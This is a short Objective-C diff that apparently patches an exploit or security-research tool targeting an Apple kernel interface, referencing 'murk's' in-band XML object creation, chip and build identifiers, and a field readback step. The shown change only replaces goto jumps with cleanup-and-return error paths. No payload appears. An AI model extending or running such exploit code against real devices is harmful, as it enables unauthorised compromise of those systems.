@@ -129,7 +129,11 @@ static NSString * const kControlXML =
     /* 3. F1 create via murk's in-band XML */
     uint32_t f1sid = 0;
     {
-        if (kF1XML.length + 1 > 0x1000) { Lf(@"[-] XML exceeds the 0x1000 in-band limit"); goto done; }
+        if (kF1XML.length + 1 > 0x1000) {
+            Lf(@"[-] XML exceeds the 0x1000 in-band limit");
+            if (g_fd >= 0) { close(g_fd); g_fd = -1; }
+            return o;   /* no cross-init jump (CI error 65 class) */
+        }
         const char *xc = kF1XML.UTF8String;
         size_t xl = strlen(xc) + 1;
         uint64_t sc[1] = {0};
@@ -141,7 +145,8 @@ static NSString * const kControlXML =
            kr, isz, f1sid);
         if (kr != KERN_SUCCESS) {
             Lf(@"[-] F1 create rejected — quote the T8150/24B156 parse delta vs murk's T8110 receipt; ladder ends honestly");
-            goto done;
+            if (g_fd >= 0) { close(g_fd); g_fd = -1; }
+            return o;   /* the rejected-create receipt is recorded above */
         }
         /* 4. field readback (murk's verification shape) */
         if (isz >= 0x90) {
